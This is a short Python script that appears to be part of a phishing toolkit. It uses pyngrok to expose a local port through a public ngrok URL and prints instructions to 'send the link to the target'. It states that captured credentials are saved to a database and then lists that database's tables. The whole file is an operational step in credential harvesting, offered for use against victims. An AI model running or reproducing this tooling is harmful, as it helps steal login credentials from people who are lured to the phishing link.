from pyngrok import ngrok
import sys
import os
import time
import argparse
sys.path.append("../Asessts")
sys.path.append("../db")

from assets import io, colors
from databaseAdmin import dbAdmin



parser= argparse.ArgumentParser()
parser.add_argument('-p', '--port', type=int, required=True, help='Port number')  
parser.add_argument('-a', '--auth', type=str, required=True, help='Auth token')
args = parser.parse_args()
port =args.port
authToken =args.auth

download_directory = './'
os.makedirs(download_directory, exist_ok=True)
ngrok_path = os.path.join(download_directory, 'ngrok')



ngrok.set_auth_token(authToken) 
config = ngrok.get_default_config(ngrok_version='v3')
config['ngrok_path'] = ngrok_path

public_url = ngrok.connect(port)
io.output(info=f"[!] url: {public_url}",color=colors.green)
io.output(info="All set successfully send the link to the target",color=colors.red)
io.output(info="The credentials will be saved in the database \n 1.to open the database",color=colors.green)
dbAdmin.list_tables()
try:
  print("Running code...")
  time.sleep(5000)

except KeyboardInterrupt:
  ngrok.disconnect(public_url)
  ngrok.kill()